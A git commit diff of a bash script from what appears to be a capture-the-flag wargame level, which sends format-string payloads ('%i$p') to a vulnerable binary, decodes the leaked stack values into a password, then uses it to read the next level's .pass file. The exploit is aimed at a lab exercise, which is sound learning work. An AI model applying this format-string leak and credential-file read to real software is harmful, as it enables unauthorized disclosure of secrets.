bcfd6209bbf41dd9a663bb112acfe417b3b0e904
ADV <a.deverdilhac@gmail.com>
2020-11-22 23:46:29 +0100

    [ade-verd] level02 in progress

--- level02/Ressources/script.sh
+++ level02/Ressources/script.sh
@@ -1,25 +1,30 @@
 #!/bin/bash
 
 i="0"
-username=""
+flag=""
 
-while [ $i -lt 30 ] && [ ${#username} -ne 41 ]
-do
-    echo -e "%$i\$p %$i\$p\n+password" > /tmp/exploit02
-    username=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
-    decoded=`echo $username | xxd -r | LC_ALL=C rev`
-    # echo "%$i\$s: $decoded"
-    printf "%%%d\$p: %.*s\t=>\t%s\n" $i, 20, $username, $decoded
-    echo -e "%$i\$p: $username\t=>\t$decoded"
+while [ $i -lt 100 ] && [ ${#flag} -ne 40 ]; do
+    echo -e "%$i\$p\npassword" > /tmp/exploit02
+
+    ptr=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
+    ptr_decoded=`echo $ptr | xxd -r | rev 2>/dev/null`
+
+    printf "%%%d\$p: %*s => %s\n" $i -30 "$ptr" "$ptr_decoded"
+
+    # concatenate consecutives strings until 40 chars
+    if [ ${#ptr_decoded} -gt 0 ]; then
+        flag+="$ptr_decoded"
+    else
+        flag=""
+    fi
     i=$[$i+1]
-    sleep 0.2
 done
 
+echo -e "\nNext pass should be: $flag"
 
-echo $username
+echo -e "AAA\n$flag" > /tmp/exploit02
 
-# set -x
-# (buildExploit; cat /tmp/exploit01 - | ~/level01) << EOI
-#     echo "\nwhoami: \$(whoami)"
-#     echo "Next pass is:  \$(cat /home/users/level02/.pass)"
-# EOI
+(cat /tmp/exploit02 - | ~/level02) << EOI
+    echo "\nwhoami: \$(whoami)"
+    echo "Next pass is:  \$(cat /home/users/level03/.pass)"
+EOI
